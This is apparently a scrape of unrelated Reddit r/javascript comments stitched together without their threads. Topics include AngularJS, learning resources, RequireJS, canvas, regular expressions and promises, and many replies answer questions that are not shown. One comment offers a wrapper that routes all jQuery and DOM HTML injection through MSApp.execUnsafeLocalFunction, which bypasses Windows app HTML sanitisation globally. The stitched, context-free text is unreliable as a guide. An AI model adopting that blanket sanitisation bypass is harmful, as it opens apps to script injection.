This was from ignite location tech (should find link) 
Great news! After what happened to Google Reader people are skeptical including myself. Great relief.
what happened to google reader? * edit FTA: &gt; I know it's supported and backed up by google, but as it seems from google killing many projects (e.g Google Reader) it makes choosing angularjs as a framework a very inconvenient choice - since the project is out of it's schedule, no official speaker talks about it and it has nothing to do with google plus,
It really shouldn't affect your skepticism in any way; it's the same company after all, and whether or not they release a trivial update to a fledgling project [doesn't change history](http://www.slate.com/articles/technology/map_of_the_week/2013/03/google_reader_joins_graveyard_of_dead_google_products.html).
For the port, I basically used emscripten and added a few simple wrapper functions. You can find the build script and minified sources here: https://github.com/akrennmair/libmp3lame-js I apologize for the Chrome-only demo application. Web/JS development is not what I usually do.
Assuming you're new to programing, this is how wished I would have started (I ended up doing all of these btw) Try starting out with a few lessons of CodeCademy to get your feet wet. Next try out a few chapters of elequent JavaScript, at least the first 3-4. They have an online version for free as well. Next read professional JavaScript by Nicholas Zakas, it is very well written and packed full of why stuff works. After you understand JS and how it works, how the Dom can be manipulated, watch the excellent (and free) 30 days to jQuery screenscast series. Lastly, read JavaScript the good parts, it's a super dense book full of good stuff so you'll want to revisit this throughout your JS journey.
Not positive about your problem, but typically, the `exports` will be the fully-qualified reference, e.g. I doubt the plugin creates a global variable `jaddress`. More likely, it augments jQuery itself, and so the 'export' in that case will likely be something like `jQuery.fn.address` or similar (their site isn't loading so I can't check the source). You can also add this somewhere after your initialization to see what is being loaded and when: requirejs.onResourceLoad = function(context, map, depMaps) { console.log('loaded: %s from %s', map.name, map.url); }; More info on [onResourceLoad](https://github.com/jrburke/requirejs/wiki/Internal-API:-onResourceLoad). 
Can this be adapted to a multi-user voice mail type system? Sounds like a good candidate to replace email.
With the right server-side technology, yes, you could easily build something like a voice mail system. Another idea that I had was building the server side into an MP3 streaming server so that people can listen to whatever you speak into your microphone in realtime.
Don't forget another example of a "great" web technology they recently abandoned: GWT
If Google killed it, wouldn't people be able to fork and continue the project? It's [on GitHub with an MIT license](https://github.com/angular/angular.js/blob/master/LICENSE).
If you use codecademy to learn javascript then you most likely are horrible at javascript. Codecademy teaches bad coding practices and they are very inconsistent. I could learn javascript from a sock faster and better than I could using codecademy. Also: Secrets of the JavaScript Ninja by Resig is good.
if a video is posted anywhere, i'd watch it
Very cool indeed. Although I think the money is building this into real-time communication for online games, something similar to any first person shooter team chat. I don't play those games so I can't give you an example, but I hope you get the gist of it.
This one is even better IMO http://javascriptweblog.wordpress.com/2010/06/07/understanding-javascript-prototypes/
it's open source, totally wrong example.
Nice, might even try my next talk with this if I can port over from reveal js without too much hassle
For what it's worth, there's a MP3 **de**coder in hand-written JavaScript here: https://github.com/nddrylliog/jsmad
You need to keep working through the CA tutorials, you are missing a lot of stuff you would need to make this work. "Return" only passes a value outside of a function, it does not write anything on to a page, which is what you are trying to do. Nor does "console.log" which CA uses to see output a whole lot. What you need to do is keep going, you have quite a bit more to learn before you are ready to make what you are trying to make. I don't mean to be vague but to explain why your code isn't working and to show you how to make it work would simply be a tutorial in JavaScript, which isn't really what this forum is for. You are just jumping ahead of yourself. Here are two things to go look in to that will help you understand why your script is not working: * What "return" does. (It does not write anything to your page, it only makes the result of a function available outside of that function. This has to do with the "scope" of variables, e.g. local variables vs. global variables.) * How to manipulate (specifically write to) the Document Object Model (DOM). This is a large topic and will have tutorials in and of itself. Keeping in mind that your code only "returns" things making them available outside of the functions they are being returned from, ask your self where you would be writing anything to an HTML page in all that. Then look in to "document.write();". Once you understand that you will at least be able to take the output of a program and get it to appear on your pages. This is not comprehensive, overall you are just overreaching a little bit. Keep working at the CA tutorials! See if you can get your hands on the book "JavaScript: The Good Parts". You are ambitious! Try just messing around with "document.write()" and a blank page and getting something simple like: var myOutput = "Hello World!"; document.write(myOutput); Then once you are comfortable getting JS to output things on to your page you will be much closer to getting this game to work! Hope that was somewhat helpful!
I'll post a link when it's up
3rd party sites? iframes all the way
It was. Thanks. I had some inkling that I needed a document.write function in there to print out the returned values, but I don't know how to use it. Thing is, I have completed the CA track on JavaScript. * If you are familiar with CA, can you recommend what to do next?* I am working through jQuery. If I am ambitious, it is because I know that there is a job waiting for me when I know enough. I just have to get there.
I guess I never used nor had reason to pay any attention to Google Reader. I'm guessing there might be a few other people like me out there, which might have something to do with why they're killing it.
For me - Eloquent Javascript and Javascript Allonge. Both give very good insight into Javascript's functional paradigm and also Javascript's prototype system. It's obvious that the Authors are really passionate and both books provide enlightening moments. Eloquent Javascript available online here http://eloquentjavascript.net/ but I have found both well worth the money (hard copy of Eloquent Javascript, ebook of Javascript Allonge).
Other answers are great. Just don't forget to namespace your code: http://addyosmani.com/blog/essential-js-namespacing/
If you're using processing.js Then why not just use the processing language? It's a subset of Java, so it's OOP-friendly.
Would it be possible to have it interact with the user in a browser?
http://ejohn.org/blog/the-world-of-ecmascript/
You need to specify jquery in your paths
Interesting, I didn't know about platform.js. I always cheat. I make an extra call for the sole purpose of pulling down the wurfl info. I can cache it locally because it's unlikely to change. :-) I do a lot of work with mobile devices, so I'm able to learn things I couldn't from just parsing the user-agent because wurlf's record of device capabilities is based on what humans know about these devices. So, user-agent (+ tell-tale signs) -&gt; device -&gt; specific set of capabilities pulled from a large zip file.
How do you spool this up locally? 
That's strange, I know plenty of people that are still using [GWT](https://developers.google.com/web-toolkit/), including Google.
Thanks again. The job is with my older brother--it'll be there when I'm ready, no rush. Right now I work as a school teacher, so again, no rush. As for a project, that's sort of what I was doing with the one that started this conversation. The game itself is straight out of a CA tutorial. I just wanted something to work toward, so I decided to try to wrap it up and make it pretty. I may well follow your advice and do the javascriptissexy.com course this summer. I'll have the time to do it right then as school is out. I plan to spend my spring break next week going through the seven day free trial at lynda.com and trying to work on this game again. Thanks again.
I've never actually heard of wurfl before. Just looked it up and looks like it would do the job. Does making that extra call increase the overhead of your application? I haven't dived too deep into mobile dev.
If that's what you're hoping for, I'm afraid you don't know what Angularjs is. 
That's very interesting, so thanks for the link. I'm more interested in learning how to convert mp3 files to audio than vice versa. This works remarkably well (when the tab with the player is on top) even on a fairly old PC.
Came here to say this. Gonna x-post it now. Edit: Apparently it was post 25 days ago! http://www.reddit.com/r/learnjavascript/comments/19h2ko/understanding_prototypes_in_javascript/
No problem! like I said I've heard good things about that javascriptissexy.com course. I've also heard positive things about lynda.com so that is probably a strong idea! Why are you leaving teaching?
I'm not. Yet. &lt;rant&gt; Teaching in the USA has become increasingly about test scores. Everything is about increasing scores. The onus for doing so is placed upon the teacher and principal. However, little has been done to address underlying social problems that feed into the lack of performance in public schools. When I was a kid, you did your work, you did your homework, you respected the teacher and your parents. Now, parents take the side of the child, litigation has made it all but impossible for teachers and principals to maintain discipline and even where discipline is till possible, the fact that administrators' evaluations are based on having low incidences of discipline issues and low retention rates make it difficult to get anything done. One of the problems that is often cited is that students make it through school without being educated, but when the student refuses to work or apply themselves and the teacher and principal are penalized when they retain the student, what other result can be expected? Also, the US has taken the approach that more legislation and more control on schools and teachers will affect better results. Never mind the fact that history says that this is not so. Finland, one of the consistently highest scoring educational systems in the world has taken the opposite approach--teachers are given very nearly free reign and testing is an absolute minimum. But our politicians keep posturing about how they are going to improve US ed through legislation. It will never work and it keeps getting worse. Finally, I have three college degrees--I lack 9 hours being a doctor of education. My test scores are consistently high. I've been in this field for 13 + years. *I still make less than $50,000/year teaching.* &lt;/end rant&gt; So I'm learning to program to make extra money on the side and serve as a net for when teaching just becomes too much to take. Also, I like learning new stuff and I can use it to write some educational games in my field (Social Studies--history, geography, civics, economics, political science) to help my kids. lynda.com was recommended by someone who has been in the industry for years, including many as an instructor. What I was able to look at without registering looks awesome. The price is less than $50/month for access to every course they offer. Seems a sweet deal. 
[Here](http://www.romancortes.com/blog/furbee-my-js1k-spring-13-entry/) is his blog post on the entry where you can find more details.
So how DO you put an svg on a leaflet map with d3?
Nothing short of amazing.
Older versions of IE, you mean. IE11 will be out soon. 11, 10, 9, 8... that's 4 versions of IE.
This is the book that got me from a beginner to a decent programmer by forcing me to slow down and really pay attention to some core aspects of the language written in a very concise manner. There will definitely be some struggles for a beginner like I was, but it will be well worth it.
We just use requirejs to load our templates, just like we load everything else.
Or you could use Twitter Hogan?
+1 for JSHint
&gt; Be sure to read [the build notes for shim.](http://requirejs.org/docs/api.html#config-shim) In particular, if using "shim" config you must build in jquery.js into your built file. &gt; ... RequireJS 2.1.0+ ... assumes backbone.js, underscore.js and jquery.js have been installed in the baseUrl directory. If not, then you may need to set a paths config for them: 
This is heavy!
Another way would be to write CoffeeScript, which sort of ensures that you never write "bad" JS. However, you still have to write correct CoffeeScript code. But that is easier than writing nice JS in my opinion.
[like so](http://calvinmetcalf.github.com/leaflet.d3/)
Icarus
How about "Driving.js" ?
Hm. Might not be very nice when it comes to search engine hits; Being a generic word, Flight had the same problems. Thanks all the same :)
I was thinking that generic English words may be bad for search engine hits. Thanks all teh same :)
yep, that sure looks simpler.
So far its worth it based on the fact that I can help some of the kids occasionally. I teach history, but I do it from the standpoint of how does this event and its causes compare to your life or possible future. For instance, when I taught the industrial revolution this year, I taught the kids all about current medical technology (stem cell research, genetics, lab-made organs), robotics coming out in the next few years (roboy, driverless cars, etc.), 3d printing, etc. I asked them to consider how their lives would change compared to how the industrial revolution changed the lives of those people. I rarely have them remember dates. Maybe half a dozen. That's what Google is for. Beyond that, I can sometimes help one of them (mostly poor kids from rough backgrounds) find some self-worth and realize that there's something better if they'll work for it. For instance, one kid, Zach, hated school and just wasn't cut out for it. He wanted to go to auto diesel school and work on cars. I told him to focus on math and reading and I'd see to it that he passed my class because those are what Zach needed (we really need a vocational alternative in our schools). He did, and though he changed his mind on what to do, he's well on his way to finishing tech school (not college) to be a welder. The ones that kill me are the ones that refuse to see that lesson of self-worth and the ability to obtain something better than the garbage (poverty, drugs, crime) they grew up in. And hey, I live in a small, poor southern town. God knows what it's like in big cities in the poor sections. Most of my colleagues actually approach this thing the same way I do, but there's always some that make school like you describe. I hate busy work. I do, very rarely, give it because busy kids don't cause trouble and sometimes I just need some time to get something done. I'd rather not, but that is part of it sometimes. Anyway, thanks for all of your help. You may have very well helped me more than anyone so far with your suggestions (and encouragement). It's been great "meeting" you. I may well pm you in the future.
eh, i wouldn't use the word amazing, its basically just painting point sprites in a super inefficient way because js1k doesn't allow gl. looks pretty but not very interesting from a technical standpoint
thanks!
Damn, another Twitter project I have to look into? Oh well, I shouldn't complain. Edit: Crap, I just found [twitter.github.com](http://twitter.github.com/).
Fixed, thank you!
Jetstream.
No documentation: No good. A person which already knows all the technologies you've bundled up will likely not use your 'seed'. A person who doesn't, on the other hand, will need guidance. Write a tutorial, documentation, wiki etc..
Once you get the basics down, Effective JavaScript by David Herman (http://effectivejs.com/) is a great resources for taking your JS to another level of proficiency.
It's a good idea. However, it doesn't really use Angular standard markup. It's *working* Angular markup, and may even be more "correct" in your view, but must people don't use `data-ng-bind`, they use `{{foo}}` bindings. In fact, most people don't use `data-ng-` at all, just `ng-`. So even if you did have documentation, which you don't, it's going to conflict slightly with online resources for Angular, which is going to confuse newer developers.
S-expression is the ultimate syntax! ))) is better than )}).
when people ask me what I do, I tell them "frustration management"
JavaScript should adopt fn for function. Short-name school FTW. It is so common these days.
To be honest, I didn't read your code, but are you familiar with the "destination-over" globalCompositeOperation? https://developer.mozilla.org/en-US/docs/HTML/Canvas/Tutorial/Compositing So you can draw your png to the canvas, and have all future drawing take place underneath. OR, you could layer the png on top of the canvas using CSS and z-index.
This is from an older, abandoned prototype and needs some cleanup/TLC. But, I just used 2 canvases: one for the outline and one for the drawing. http://jsfiddle.net/uwyMK/1/ EDIT: the drawing code I swiped and modified from some tutorial site that I can no longer remember. 
just use CoffeeScript, then you can just type `()-&gt;`
Relevant xkcd: http://xkcd.com/297/
[animationend](https://developer.mozilla.org/en-US/docs/DOM/Mozilla_event_reference/animationend)
I've only played with it a little but I don't think you will get trapped. I think it does a lot more stuff for you than Backbone and makes more sense than Ember. A couple of things I remember though. You might want to access Angular from the global scope (probably not but you might). You can do it this way: var e = window.document.getElementById('mainctl'); var scope = window.angular.element(e).scope(); scope.$apply(function() { scope.doSomething(); return undefined; }); Google for 'AngularJS $apply' Another thing is that Angular might start validating before you want without the right flag. http://deansofer.com/posts/view/14/AngularJs-Tips-and-Tricks-UPDATED#validation I think the trick is the 'pristine' flag https://groups.google.com/forum/?fromgroups=#!topic/angular/W1Yya5TfIWo One other thing is that if you want to use the custom element names (you don't have to) you need some code at the top for IE like they mention in the docs: http://docs.angularjs.org/guide/ie 
I've only had issues with angular when it's come to implementing **really** graphical stuff, like integrating BonsaiJS or Raphael libraries in an "angular" way. (I'd have the same issues in Ember and Backbone tbh) Other than that, it's awesome!
These days with personalized search you'd be surprised. Chai and Mocha both have the js library come up first for me.
require-text FTW
Sweet. Thanks for the heads up.
&gt; function load2images{ That's not going to work
For any more than three or four nest synchronous events, you should use a flow control library like [Frame.js](https://github.com/bishopZ/Frame.js) or [asnyc](https://github.com/caolan/async).
I was trying the latter without success. I'm going to check out the link - thank you so much. I'm a novice with JS but I'm a mighty quick learner. Thank you for the help!
You are an absolute gem. I cannot thank you enough. I'm going to check out what you did!! The codes works wonderfully in an editor. I'm trying to implement it in an HTML "widget" which is being really painful. I'll update you (if you care?) when I make progress.
The only thing that I can think of so far is the fact that Angular only lets you map one url to one view by default. It's possble, and not even especially difficult, to create your own solution with ng-include/$compile/etc, but it would be nice to see an official way to handle things like that.
Wow, that knocks my socks off!
Hi folks :) I wrote this component and if anyone has questions or suggestions I'll be happy to answer them.
the infamous 21 nested callback, truly an /r/shittyprogramming gem, thank you.
WOAH! Twitter is using a modular pattern for their development; good on them.
What are the new updates?
Lots of small bug fixes and improvements. Probably the biggest fix is changing the tab behavior from suggestions in the previous reddit thread. I need to start creating changelogs for each release.
Bort. You should name your new framework Bort.
Noboy does brackets that way in JS... had to stop reading. everytime you put an opening bracket on a new line, god makes someone use IE6.
Thus the best way of learning to learn is doing to do. 
I hope you figured this out, but no I really think it will have a negligible impact on cpu
No, my framework is also named Bort
Many thanks for the solution! Using the suggestion, my code is working great. **Except** now I have four calls to drawimages instead of the two I had previously. Can't seem to find out why. This is the only code change I made. Well, off to debug some more! //place variables at top of file var img1 = new Image(); var img2 = new Image(); var img1done = false; var img2done = false; var x = 0; //load 2 images function load2images(){ img1.onload = function () { img1done=true; if (img2done) { drawimages(); } }; img2.onload = function () { img2done=true; if (img1done) { drawimages(); } }; img1.src="/image1.jpg"; img2.src="/image2.jpg"; } //draw the two images drawimages(){ ++x console.log(x); //working code goes here } 
When I first saw the title I thought it was stupid. Read the article and thought it was great. Humbled.
You're probably right, the browsers capable of correctly displaying HTML5 usually don't run on slower computers or mobile phones. And I did solve it, except I need to tweak it for browsers other than Chrome. Thanks.
It is a little annoying that MS requires you to wrap any dynamic HTML injection with MSApp.execUnsafeLocalFunction(fn)... I wrote a method that you can use to wrap library functions externally, without having to edit the library directly: http://pastebin.com/Yu6QamM9 I've been able to use jquery-1.9.1 and angular out of the box (without editing the source in either library) by overwriting these functions: * Node.prototype.appendChild * Node.prototype.insertBefore * $.prototype.append * $.prototype.html * $.fn.append * $.fn.html EDIT: forgot a couple functions.
In addition to the beauty of doing this in regular expressions, some people are driven by an inherent force to push things to the limits... This page obviously has no practical purpose, besides being informative.
I'm just going to leave a real regular expression I wrote here ... ((?:[,\[]|(?:\((?!\))) *)(?: +(?:[^a-zA-Z, ;"'\-+!\^\[\]/|()]|[b-mB-Mp-zP-Z]|(?:[aA](?![nN][dD]\b))|(?:[nN] (?!(?:[oO][tT])|(?:[eE][wW])\b))|(?:[oO](?![rR]\b))|(?:/(?!/))|(?:\.(?![0-9_]))(?:[^, ;"'\%&lt;&gt;=+\-*/~&amp;! \^\[\]|()]|(?:/(?!/))|(?:\.(?![0-9_])))*))(?: +(?:[^a-zA-Z:\.%&lt;&gt;=+\-*/~&amp;, ;"'}|()\]]|[b-mB-Mp-zP-Z]|(?: [aA](?![nN][dD]\b))|(?:[nN](?!(?:[oO][tT])|(?:[eE][wW])\b))|(?:[oO](?![rR]\b)))[^:\.%&lt;&gt;=+\-*/~&amp;, ;"'}|()\]]*)+[,)]?\b)|((?:[,\[]|(?:\((?!\))) *)(?:(?:[^a-zA-Z, ;"'\-+!^\[\])/|()]|[b-mB-Mp-zP-Z]|(?:[aA] (?![nN][dD]\b))|(?:[nN](?!(?:[oO][tT])|(?:[eE][wW])\b))|(?:[oO](?![rR]\b))|(?:/(?!/))|(?:\.(?![0-9_])))(?:[^, ;"'\%&lt;&gt;=+\-*/~&amp;!^\[\])|()]|(?:/(?!/))|(?:\.(?![0-9_])))*)(?: +(?:[^a-zA-Z:\.%&lt;&gt;=+\-*/~&amp;, ;"'}|()\]]| [b-mB-Mp-zP-Z]|(?:[aA](?![nN][dD]\b))|(?:[nN](?!(?:[oO][tT])|(?:[eE][wW])\b))|(?:[oO](?![rR]\b)))[^: \.%&lt;&gt;=+\-*/~&amp;, ;"'}|()\]]*)+[,)]?\b)
Wow awesome solution - I've been looking for something easier but was leaning more towards an AST transformer. I'll test out your solution tomorrow - do you mind if I add it to the post if it works good?
Go right ahead :) I've been including this in my default/index.html: http://pastebin.com/2rckniFm I tried having a specific file that does the overwriting without polluting the global scope with the overwriteFunctions method. The issue there is you have to overwrite the two Node functions before including jquery. You have to overwrite all the jquery stuff prior to loading angular, and if you set a timeout this won't happen.
Yeh, i don't care if nobody does it that way ;) i just personally think the other way is confusing. But i just found out that there's a reason to do it the confusing way in JS, so i changed that.
The "regular" part of regular expression didn't know what kind of bastardized language it would become a part of. "Coded Expression" seems more fitting. I do have to wonder if it would be more appropriate to use a string parsing class instead of this nonsense (really it's lovely for what you accomplished but hideous for the next developer). Could a parsing class or function be faster, or just as fast? Sure. Could you break it into manageable chunks of code that can be reused and updated? Yes. Could another person understand what you did if you broke it apart? Most definitely. [Here's an explanation (if you can understand it).](http://rick.measham.id.au/paste/explain.pl?regex=%28%28%3F%3A%5B%2C%5C%5B%5D%7C%28%3F%3A%5C%28%28%3F%21%5C%29%29%29+*%29%28%3F%3A+%2B%28%3F%3A%5B%5Ea-zA-Z%2C+%3B%22%27%5C-%2B%21%5C%5E%5C%5B%5C%5D%2F%7C%28%29%5D%7C%5Bb-mB-Mp-zP-Z%5D%7C%28%3F%3A%5BaA%5D%28%3F%21%5BnN%5D%5BdD%5D%5Cb%29%29%7C%28%3F%3A%5BnN%5D+%28%3F%21%28%3F%3A%5BoO%5D%5BtT%5D%29%7C%28%3F%3A%5BeE%5D%5BwW%5D%29%5Cb%29%29%7C%28%3F%3A%5BoO%5D%28%3F%21%5BrR%5D%5Cb%29%29%7C%28%3F%3A%2F%28%3F%21%2F%29%29%7C%28%3F%3A%5C.%28%3F%21%5B0-9_%5D%29%29%28%3F%3A%5B%5E%2C+%3B%22%27%5C%25%3C%3E%3D%2B%5C-*%2F~%26%21+%5C%5E%5C%5B%5C%5D%7C%28%29%5D%7C%28%3F%3A%2F%28%3F%21%2F%29%29%7C%28%3F%3A%5C.%28%3F%21%5B0-9_%5D%29%29%29*%29%29%28%3F%3A+%2B%28%3F%3A%5B%5Ea-zA-Z%3A%5C.%25%3C%3E%3D%2B%5C-*%2F~%26%2C+%3B%22%27%7D%7C%28%29%5C%5D%5D%7C%5Bb-mB-Mp-zP-Z%5D%7C%28%3F%3A+%5BaA%5D%28%3F%21%5BnN%5D%5BdD%5D%5Cb%29%29%7C%28%3F%3A%5BnN%5D%28%3F%21%28%3F%3A%5BoO%5D%5BtT%5D%29%7C%28%3F%3A%5BeE%5D%5BwW%5D%29%5Cb%29%29%7C%28%3F%3A%5BoO%5D%28%3F%21%5BrR%5D%5Cb%29%29%29%5B%5E%3A%5C.%25%3C%3E%3D%2B%5C-*%2F~%26%2C++%3B%22%27%7D%7C%28%29%5C%5D%5D*%29%2B%5B%2C%29%5D%3F%5Cb%29%7C%28%28%3F%3A%5B%2C%5C%5B%5D%7C%28%3F%3A%5C%28%28%3F%21%5C%29%29%29+*%29%28%3F%3A%28%3F%3A%5B%5Ea-zA-Z%2C+%3B%22%27%5C-%2B%21%5E%5C%5B%5C%5D%29%2F%7C%28%29%5D%7C%5Bb-mB-Mp-zP-Z%5D%7C%28%3F%3A%5BaA%5D+%28%3F%21%5BnN%5D%5BdD%5D%5Cb%29%29%7C%28%3F%3A%5BnN%5D%28%3F%21%28%3F%3A%5BoO%5D%5BtT%5D%29%7C%28%3F%3A%5BeE%5D%5BwW%5D%29%5Cb%29%29%7C%28%3F%3A%5BoO%5D%28%3F%21%5BrR%5D%5Cb%29%29%7C%28%3F%3A%2F%28%3F%21%2F%29%29%7C%28%3F%3A%5C.%28%3F%21%5B0-9_%5D%29%29%29%28%3F%3A%5B%5E%2C++%3B%22%27%5C%25%3C%3E%3D%2B%5C-*%2F~%26%21%5E%5C%5B%5C%5D%29%7C%28%29%5D%7C%28%3F%3A%2F%28%3F%21%2F%29%29%7C%28%3F%3A%5C.%28%3F%21%5B0-9_%5D%29%29%29*%29%28%3F%3A+%2B%28%3F%3A%5B%5Ea-zA-Z%3A%5C.%25%3C%3E%3D%2B%5C-*%2F~%26%2C+%3B%22%27%7D%7C%28%29%5C%5D%5D%7C+%5Bb-mB-Mp-zP-Z%5D%7C%28%3F%3A%5BaA%5D%28%3F%21%5BnN%5D%5BdD%5D%5Cb%29%29%7C%28%3F%3A%5BnN%5D%28%3F%21%28%3F%3A%5BoO%5D%5BtT%5D%29%7C%28%3F%3A%5BeE%5D%5BwW%5D%29%5Cb%29%29%7C%28%3F%3A%5BoO%5D%28%3F%21%5BrR%5D%5Cb%29%29%29%5B%5E%3A+%5C.%25%3C%3E%3D%2B%5C-*%2F~%26%2C+%3B%22%27%7D%7C%28%29%5C%5D%5D*%29%2B%5B%2C%29%5D%3F%5Cb%29)
I actually disagree, pretty heavily, if you do it right! The regular expression I posted actually doesn't represent the reality. That is how the regex looks, *after it is generated!*. In my code, it is about 3 or 4 pages long. That is because the parts of it are split up, and cruft/boiler plate regex is generated or tacked on appropriately. Above the regex is a list of rules of what it matches, written in english, with example code of what it does and does not match, and links to tests. The regex was built for a language parser in an editor. Version 1, was done 'properly', with no regular expression, on top of Code Mirror. After about 2 or 3 months of work, what I had was slow, error prone, and hard to extend. I ripped it out, and had it replaced with a regex version built on top of Ace, within a *single afternoon!* Ok, it does not support full recursion, but for syntax highlighting, I don't need a full parser. The regex above, also points out syntax errors, so you can do some clever stuff. Plus because it's just a regex, I can easily slot them in or out. i.e. // error'ing syntax gets a 'syntax-error' class applied to them syntaxHighlight( errorRegex, 'syntax-error' ); Obviously you can have things optionally turned on or off with a parser approach, but it tends to come more naturally with regex based solutions. The problem is that developers sit down to write regular expressions, and write them out like how I have posted it above. If you do that, yes, it sucks. If you just split it up though, write out example tests, and run them as you build the regex, *and keep that stuff around*, then it's really not so bad. tl;dr; just like with any other code, use good practices. edit: 'does support recursion' =&gt; 'does not support recursion'.
Sometimes it's okay to undertake something like this just as an interesting exercise. I don't think the author is making the claim that this is a good idea to do in practice. It's just interesting and amusing exploration of one of the lesser known features of regular expressions. 
Cool, but definitely not (restricted to) Javascript.
Am I getting this right in concluding that one can also write a regular expression to match multiples of 2013 as well? Read the n-digits number from left to right, and while reading the number, divide by 2013 using pen and paper but discard quotients and only keep remainders. At any time, you are only keeping an O(1) amount of information, that's a finite state machine. The number is a multiple of 2013 if and only if the final remainder at the end of pen and paper calculation is zero.
There is always a relevent xkcd
A problem in a mid-term exam I took was about finding a DFA which checks whether a binary number is a multiple of 7. I only thought the hard way to do and drew a crude 21-state machine. I realized there was a very simple way, just after the exam finished.
They're starting to discuss it: https://code.google.com/p/v8/issues/detail?id=2599
Almost. It actually finds repeating identifiers and numbers, within an array, which are not separated by commas. If a match is found, it's highlighted in red. It's more complex, by having to take into account keywords, such as 'and', 'or', and 'new'. So this is matched: [ a b ] ... but this is not ... [ new b ] At least I think it's this one that does it.
what was the simple way?
Make 7 states, each representing remainders 0~6. Begin with state 0, Cur. In. Nxt. 0 0 0 0 1 1 1 0 2 1 1 3 2 0 4 2 1 5 3 0 6 3 1 0 4 0 1 4 1 2 5 0 3 5 1 4 6 0 5 6 1 6 ... and a number is accepted when the final state is (also) 0. The DFA in the link has the same principle. A:0, B:1, C:2.
Some say beauty, some says travesty. Tomato tomato.
Can you explain why? I wanted to create a d3.js, WebGL, three.js &amp; AngularJS dashboard, so I'm curious to know the reason why AngularJS wouldn't mix well with graphical libs? 
If this is not comment of the year, i'm quitting!
What the hell does this match?
You should test for features/constraints not browsers. If you are writing a responsive site your CSS([media queries](http://www.w3.org/TR/css3-mediaqueries/)) should handle any design. If you are worried about keeping page size down your backend should do any verification before serving data(sometimes).
I finally integrated JQuery's deferred/promises into my project. It really helped solve some ajax callback hell issues in a very elegant way. Such a powerful tool. http://www.youtube.com/watch?v=juRtEEsHI9E this talk was very helpful in demonstrating all the different uses of this pattern
When I began programming, in QBasic, I used to create my graphics by manually settings pixels on the screen using PSET X, Y, Color or something like that and grabbing them off the screen for later use. Luckily QBasic allowed me to stuff those in subroutines in seperate screens/files, otherwise - trust me - I would have put them in a 20.000 LOC single file ^_^
I said it to be silly, and then I looked at it again and though, shit, that's actually pretty good. I'm not sure if it's Taoist or Zen or both or neither, but it really is the way I feel about learning and teaching. I have a three-year-old and I try to get him to see chores, brushing his teeth, etc -- as a game or adventure that's worth doing in its own right, not because of the rewards they might entail. With any luck, he'll manage to live without ever thinking that reading a book or solving a difficult problem is punishment.
That social nav thing on the left side is laggy. Out to use CSS transitions, and when they aren't available, just set it to be 'position: fixed'.
You can do browser agent string sniffing on the server level then and redirect users to a page before they load your site then, no point in giving them data for the page then deciding afterwards they shouldn't use it.
The author of this lengthy and well-written article mentions that the *best* solution is to make your libraries fluent so the user of the library can specify just one callback after all of the asynchronous stuff has completed, and allow the code to *look* synchronous for the most-part. But if you're using many small asynchronous libraries together, you'll still have to glue things together with callbacks or promises, etc. [Except if you use queue-flow](http://dfellis.github.com/queue-flow/) to glue the steps together. It can take "classic Node.js-style" functions that expect a callback with an "error, result" argument list using the ``.node`` method, or Promises with the ``.promise`` method, as well as classic functional programming methods such as ``.map``, ``.filter``, ``.reduce``, etc taking either synchronous *or* asynchronous functions as arguments. (It does this with some guesswork based on the function's argument length, but you can override the choice for any of the methods by calling ``.methodSync`` or ``.methodAsync``.) By having the fluency external glue to your logic, you don't have to worry if your steps are synchronous or asynchronous, or whether the library supports fluency out-of-the-box or not, or whether every method you want to call is in just one library. :)
It has more functionality than those libraries. Check out the examples: http://autocompletejs.com/examples
I'm pretty sure this is a standard undergrad CS problem. Kind of funny seeing it blown up into a huge blog post. That said, I'm kind of dismayed by some of the comments here along the lines of "couldn't he use parseInt and mod". Yes, but that isn't the point. The point is to explore what regular expressions can do, and to expand your mind.
I've been using promises just as a way of making sure x, y, and z are done before loading the next thing. This article explains that they are actually meant to do a lot more as they represent values that don't exist yet rather than just a way to make sure stuff happens in order.
Are you using Web Forms or MVC? Does the server need to be contacted to get the values for the subsequent drop downs? Are you using jQuery or another JavaScript library?
[Pyramid of Doom](http://theageofvolcanoes.files.wordpress.com/2010/10/indiana-jones-whip.jpg) 
And that is one wrong way to solve the FizzBuzz problem.
Tough to say without seeing how and where you're calling load2images().
I can use jQuery if it will make life easier. I am using web forms and c#. I could, in theory, place all of the possible data on the client end, but if it is possible to contact the server without a postback, that would be good too.
&gt; Tomato tomato. That saying is hilarious in text. It reads like a tag-line akin to [Magnitude's "pop pop" on Community](https://www.youtube.com/watch?v=421iZk22HyQ).
This is a (somewhat) off-topic nitpick, but can't we find a better pattern than "Introducing X"? I mean, this title could well read just: &gt;Nintendo Web Framework, a development environment based on WebKit technologies, HTML5, CSS3, and Javascript Instead I'm supposed to believe that every newfunthing.js is being dramatically unveiled in some flashy manner. 
Nope. I've never once wished I were using something different. It's made my life as a web developer soooo much easier, and any time I think I've hit a barrier, I've found that I'm actually underthinking things. You learn to stop doing that the farther you get away from the jQuery way of doing things.
I don't learn as well from books as I do through applied learning, so I started with code academy. I would like to improve my skills and learn the right way to code, what interactive way of learning JavaScript would you recommend?
Since you're using Web Forms, the easiest solution would be to wrap your DropDownList controls in an UpdatePanel and write normal Web Forms code. You can also use the [CascadingDropDown](http://www.asp.net/ajaxLibrary/AjaxControlToolkitSampleSite/CascadingDropDown/CascadingDropDown.aspx) control from the AjaxControlToolkit. If you want to use this as an exercise to actually write JavaScript so you can start learning it, you'll need to use the DOM API to create the label, select, and option elements you'll need and add/remove them from the document. You'll also need to know how to handle events so that you can respond to an option being selected in your select elements. To get the options for the next list, you'll have to use Ajax to communicate with the server. This will require writing an endpoint on the server that can return the data in a format suitable for JavaScript (usually JSON). jQuery makes interacting with the DOM and performing the Ajax much easier than using its raw API. I can give more tips after I get back from lunch if you decide to go the JavaScript route.
Thank you for the response. I will look into the UpdatePanel and CascadingDropDown options you presented. I really do need to get over my fear of javascript, though. Once people start talking about Ajax, the DOM, and JSON, I get intimidated, because I know that it's alll very complex, but essential for javascript.
a common use case is going to be to allow the tab key (or enter, or whatever) also allow something that the autocomplete list does not contain -- do you already offer this? Doesn't seem apparent from the docs... e.g. ["Apple","Banana","Orange"] user types: Strawberry there may be a case where the user wants to add this to a list.
Actually, it *was* unveiled at GDC. That aside, that's seriously nitpicky. You're irritated by my title? Come on. Go be a Negative Nancy somewhere else.
What's the benefit? It's not helping with readability, when you compare this... function factorial (n) { return n ? n * factorial(n - 1) : 1 } ...to this... function factorial (n) { var innerFactorial = trampoline( function myself (acc, n) { return n.greater(0) ? function () { return myself(acc.times(n), n.minus(1)); } : acc }); return innerFactorial(bigInt.one, bigInt(n)); }
